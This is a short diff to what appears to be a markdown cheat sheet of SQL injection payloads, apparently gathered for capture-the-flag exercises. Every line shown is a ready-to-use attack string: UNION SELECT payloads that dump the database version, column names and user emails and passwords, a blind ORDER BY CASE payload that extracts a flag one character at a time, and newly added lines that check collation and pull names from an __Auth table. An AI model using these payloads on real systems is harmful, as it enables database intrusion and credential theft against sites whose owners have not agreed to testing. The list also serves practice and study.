@@ -37,6 +37,9 @@ santaa_clauz" UNION ALL SELECT 1,2,3,4,@@version#
 ' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
 ' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
 order by (CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = 'a' then title else date end) ASC
+
+SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "[TABLE_NAME]" AND COLUMN_NAME = "[COLUMN_NAME]";
+" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
 ```
 {% endcode %}
 
